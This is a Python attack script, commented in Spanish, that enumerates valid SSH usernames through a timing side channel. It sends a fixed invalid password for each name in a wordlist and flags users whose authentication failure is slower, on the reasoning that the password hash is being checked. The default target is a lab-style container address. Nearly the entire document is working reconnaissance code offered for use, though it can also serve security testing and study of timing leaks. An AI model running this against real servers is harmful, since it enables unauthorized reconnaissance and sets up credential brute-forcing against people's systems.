#!/usr/bin/env python3
"""
Enumeracion de usuarios por canal lateral de temporizacion en SSH.

OpenSSH con pam_unix responde mas lento cuando el usuario EXISTE y tiene hash
de contrasena que comprobar (el hash se verifica) que cuando no existe
(rechazo inmediato). Midiendo el tiempo hasta el fallo de autenticacion se
distingue el caso: la mediana de varios intentos separa los grupos.

Uso:
    python3 enum_users.py -H 172.17.0.2 -U wordlists/users.txt
"""
import argparse
import socket
import statistics
import sys
import threading
import time

import paramiko
import logging

logging.getLogger("paramiko").setLevel(logging.CRITICAL)


def measure(user, host, port, samples):
    times = []
    for _ in range(samples):
        try:
            s = socket.create_connection((host, port), timeout=15)
        except OSError:
            continue
        tr = paramiko.Transport(s)
        try:
            tr.start_client(timeout=20)
        except Exception:
            try:
                tr.close()
            except Exception:
                pass
            continue
        t = time.time()
        try:
            tr.auth_password(user, "invalid-probe-password")
        except Exception:
            pass
        times.append(time.time() - t)
        try:
            tr.close()
        except Exception:
            pass
    return times


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-H", "--host", default="172.17.0.2")
    ap.add_argument("-p", "--port", type=int, default=22)
    ap.add_argument("-U", "--userfile", required=True)
    ap.add_argument("-n", "--samples", type=int, default=5)
    ap.add_argument("-t", "--threads", type=int, default=6)
    args = ap.parse_args()

    users = [u.strip() for u in open(args.userfile, encoding="utf-8") if u.strip()]

    results = {}
    lock = threading.Lock()
    queue = list(users)

    def worker():
        while True:
            with lock:
                if not queue:
                    return
                u = queue.pop(0)
            ts = measure(u, args.host, args.port, args.samples)
            if ts:
                with lock:
                    results[u] = statistics.median(ts)

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(args.threads)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    base = min(results.values()) if results else 0
    print(f"\n{'usuario':<20}{'mediana':>10}{'delta base':>13}   veredicto")
    print("-" * 62)
    for u, t in sorted(results.items(), key=lambda kv: kv[1], reverse=True):
        delta = t - base
        tag = "EXISTE (hash que verificar)" if delta > 0.55 else "no existe / bloqueado"
        print(f"{u:<20}{t:>9.3f}s{delta:>+12.3f}s   {tag}")


if __name__ == "__main__":
    sys.exit(main())
